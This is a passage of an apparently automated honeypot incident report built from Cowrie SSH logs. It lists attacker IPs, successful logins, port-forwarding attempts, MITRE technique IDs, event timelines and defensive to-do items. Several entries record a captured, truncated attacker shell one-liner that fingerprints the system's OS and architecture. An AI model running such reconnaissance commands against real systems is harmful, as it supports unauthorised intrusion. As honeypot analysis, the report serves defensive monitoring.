| `2026-07-21 04:37:44` | `cowrie.command.input` |
| `2026-07-21 04:37:44` | `cowrie.log.closed` |
| `2026-07-21 04:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a091028de06

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-07-21 04:38 |
| **Last Seen** | 2026-07-21 04:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:38:56` | `cowrie.session.connect` |
| `2026-07-21 04:38:56` | `cowrie.client.version` |
| `2026-07-21 04:38:56` | `cowrie.client.kex` |
| `2026-07-21 04:38:58` | `cowrie.login.success` |
| `2026-07-21 04:38:59` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:39:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-771da31e75f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:39 |
| **Last Seen** | 2026-07-21 04:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:39:38` | `cowrie.session.connect` |
| `2026-07-21 04:39:38` | `cowrie.client.version` |
| `2026-07-21 04:39:38` | `cowrie.client.kex` |
| `2026-07-21 04:39:40` | `cowrie.login.success` |
| `2026-07-21 04:39:42` | `cowrie.session.params` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:42` | `cowrie.command.success` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:42` | `cowrie.command.input` |
| `2026-07-21 04:39:43` | `cowrie.log.closed` |
| `2026-07-21 04:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11945b8662d3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:41 |
| **Last Seen** | 2026-07-21 04:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:41:35` | `cowrie.session.connect` |
| `2026-07-21 04:41:35` | `cowrie.client.version` |
| `2026-07-21 04:41:35` | `cowrie.client.kex` |
| `2026-07-21 04:41:37` | `cowrie.login.success` |
| `2026-07-21 04:41:39` | `cowrie.session.params` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.command.success` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.command.input` |
| `2026-07-21 04:41:39` | `cowrie.log.closed` |
| `2026-07-21 04:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-954e2924d73b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:43 |
| **Last Seen** | 2026-07-21 04:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:43:32` | `cowrie.session.connect` |
| `2026-07-21 04:43:32` | `cowrie.client.version` |
| `2026-07-21 04:43:32` | `cowrie.client.kex` |
| `2026-07-21 04:43:34` | `cowrie.login.success` |
| `2026-07-21 04:43:36` | `cowrie.session.params` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.command.success` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.command.input` |
| `2026-07-21 04:43:36` | `cowrie.log.closed` |
| `2026-07-21 04:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73922041033b

| Field | Detail |
|---|---|
| **Source IP** | `148.66.142[.]9` |
| **First Seen** | 2026-07-21 04:43 |
| **Last Seen** | 2026-07-21 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:43:36` | `cowrie.session.connect` |
| `2026-07-21 04:43:36` | `cowrie.client.version` |
| `2026-07-21 04:43:36` | `cowrie.client.kex` |
| `2026-07-21 04:43:37` | `cowrie.login.success` |
| `2026-07-21 04:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.142[.]9` to AbuseIPDB if not already reported
- [ ] Block `148.66.142[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe52e36a3f82

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-21 04:43 |
| **Last Seen** | 2026-07-21 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:43:37` | `cowrie.session.connect` |
| `2026-07-21 04:43:37` | `cowrie.client.version` |
| `2026-07-21 04:43:37` | `cowrie.client.kex` |
| `2026-07-21 04:43:37` | `cowrie.login.success` |
| `2026-07-21 04:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1fc63c8624

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 04:43 |
| **Last Seen** | 2026-07-21 04:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:43:47` | `cowrie.session.connect` |
| `2026-07-21 04:43:47` | `cowrie.client.version` |
| `2026-07-21 04:43:47` | `cowrie.client.kex` |
| `2026-07-21 04:43:47` | `cowrie.login.success` |
| `2026-07-21 04:43:47` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:43:47` | `cowrie.direct-tcpip.data` |
| `2026-07-21 04:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60dbea20f8d1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:45 |
| **Last Seen** | 2026-07-21 04:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:45:27` | `cowrie.session.connect` |
| `2026-07-21 04:45:27` | `cowrie.client.version` |
| `2026-07-21 04:45:27` | `cowrie.client.kex` |
| `2026-07-21 04:45:29` | `cowrie.login.success` |
| `2026-07-21 04:45:30` | `cowrie.session.params` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:30` | `cowrie.command.success` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:30` | `cowrie.command.input` |
| `2026-07-21 04:45:31` | `cowrie.log.closed` |
| `2026-07-21 04:45:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a526dcfbe39

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]218` |
| **First Seen** | 2026-07-21 04:46 |
| **Last Seen** | 2026-07-21 04:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:46:20` | `cowrie.session.connect` |
| `2026-07-21 04:46:20` | `cowrie.client.version` |
| `2026-07-21 04:46:20` | `cowrie.client.kex` |
| `2026-07-21 04:46:22` | `cowrie.login.success` |
| `2026-07-21 04:46:22` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]218` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb2347b5b099

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-07-21 04:46 |
| **Last Seen** | 2026-07-21 04:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:46:27` | `cowrie.session.connect` |
| `2026-07-21 04:46:28` | `cowrie.client.version` |
| `2026-07-21 04:46:28` | `cowrie.client.kex` |
| `2026-07-21 04:46:28` | `cowrie.login.success` |
| `2026-07-21 04:46:29` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a804f77a749d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:47 |
| **Last Seen** | 2026-07-21 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:47:23` | `cowrie.session.connect` |
| `2026-07-21 04:47:23` | `cowrie.client.version` |
| `2026-07-21 04:47:23` | `cowrie.client.kex` |
| `2026-07-21 04:47:25` | `cowrie.login.success` |
| `2026-07-21 04:47:26` | `cowrie.session.params` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:26` | `cowrie.command.success` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:26` | `cowrie.command.input` |
| `2026-07-21 04:47:27` | `cowrie.log.closed` |
| `2026-07-21 04:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647232746943

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:49 |
| **Last Seen** | 2026-07-21 04:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:49:18` | `cowrie.session.connect` |
| `2026-07-21 04:49:19` | `cowrie.client.version` |
| `2026-07-21 04:49:19` | `cowrie.client.kex` |
| `2026-07-21 04:49:20` | `cowrie.login.success` |
| `2026-07-21 04:49:22` | `cowrie.session.params` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:22` | `cowrie.command.success` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:22` | `cowrie.command.input` |
| `2026-07-21 04:49:23` | `cowrie.log.closed` |
| `2026-07-21 04:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57187e2aac2

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-07-21 04:50 |
| **Last Seen** | 2026-07-21 04:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:50:15` | `cowrie.session.connect` |
| `2026-07-21 04:50:16` | `cowrie.client.version` |
| `2026-07-21 04:50:16` | `cowrie.client.kex` |
| `2026-07-21 04:50:18` | `cowrie.login.success` |
| `2026-07-21 04:50:18` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8c07fba41af

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:51 |
| **Last Seen** | 2026-07-21 04:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:51:14` | `cowrie.session.connect` |
| `2026-07-21 04:51:14` | `cowrie.client.version` |
| `2026-07-21 04:51:14` | `cowrie.client.kex` |
| `2026-07-21 04:51:16` | `cowrie.login.success` |
| `2026-07-21 04:51:18` | `cowrie.session.params` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.command.success` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.command.input` |
| `2026-07-21 04:51:18` | `cowrie.log.closed` |
| `2026-07-21 04:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a45e66992bdf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:53 |
| **Last Seen** | 2026-07-21 04:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:53:13` | `cowrie.session.connect` |
| `2026-07-21 04:53:14` | `cowrie.client.version` |
| `2026-07-21 04:53:14` | `cowrie.client.kex` |
| `2026-07-21 04:53:16` | `cowrie.login.success` |
| `2026-07-21 04:53:17` | `cowrie.session.params` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.command.success` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.command.input` |
| `2026-07-21 04:53:17` | `cowrie.log.closed` |
| `2026-07-21 04:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a6753fc924f

| Field | Detail |
|---|---|
| **Source IP** | `125.69.76[.]148` |
| **First Seen** | 2026-07-21 04:53 |
| **Last Seen** | 2026-07-21 04:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:53:55` | `cowrie.session.connect` |
| `2026-07-21 04:53:55` | `cowrie.client.version` |
| `2026-07-21 04:53:55` | `cowrie.client.kex` |
| `2026-07-21 04:53:57` | `cowrie.login.success` |
| `2026-07-21 04:53:58` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.69.76[.]148` to AbuseIPDB if not already reported
- [ ] Block `125.69.76[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47c2b643cd94

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-07-21 04:54 |
| **Last Seen** | 2026-07-21 04:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:54:08` | `cowrie.session.connect` |
| `2026-07-21 04:54:08` | `cowrie.client.version` |
| `2026-07-21 04:54:08` | `cowrie.client.kex` |
| `2026-07-21 04:54:10` | `cowrie.login.success` |
| `2026-07-21 04:54:11` | `cowrie.direct-tcpip.request` |
